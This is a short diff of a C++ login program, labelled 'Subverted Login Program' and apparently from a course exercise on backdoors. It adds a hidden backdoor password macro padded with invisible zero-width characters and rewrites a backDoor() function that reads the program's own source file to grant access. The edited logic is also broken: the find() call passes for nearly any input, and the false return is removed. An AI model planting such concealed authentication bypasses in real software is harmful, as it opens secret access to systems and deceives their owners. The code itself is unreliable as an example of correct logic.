@@ -1,4 +1,4 @@
-#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
+// Subverted Login P​rogram
 
 #include <iostream>
 #include <iomanip>
@@ -6,6 +6,8 @@
 #include <sstream>
 #include "authlib.h"
 #include "openssl/sha.h"
+
+#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
 
 char character;
 
@@ -28,16 +30,16 @@ string getSHA256(const string& input) {
 bool backDoor(const string& password) {
     ifstream sourceFile("login-subverted.cpp");
     string line;
+    char character;
     if (getline(sourceFile, line)) {
-        char character = line[25 + password.length()];
+        character = line[20];
     }
     sourceFile.close();
 
-    if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ + character) {
+    if (password.find(character)) {
         return true;
-    } else {
-        return false;
     }
+ 
 }
 
 int main() {
